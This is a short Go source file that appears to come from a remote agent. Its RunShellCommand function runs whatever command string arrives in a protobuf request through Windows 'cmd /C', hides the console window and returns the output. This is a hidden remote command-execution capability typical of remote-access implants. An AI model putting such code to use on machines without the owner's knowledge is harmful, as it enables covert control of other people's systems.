package modules

import (
	pb "agent/protos/cmds"
	"fmt"
	"log"
	"os/exec"
	"syscall"
)

func RunShellCommand(req *pb.ShellCommandRequest) *pb.ShellCommandResponse {
	log.Printf("running shell command: '%s'", req.Cmd)
	cmd := exec.Command("cmd", "/C", req.Cmd)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		msg := fmt.Sprintf("%v : %s", err, out)
		log.Printf("failed to run shell command: %s", msg)
		return &pb.ShellCommandResponse{Data: out, Err: msg}
	}
	return &pb.ShellCommandResponse{Data: out}
}
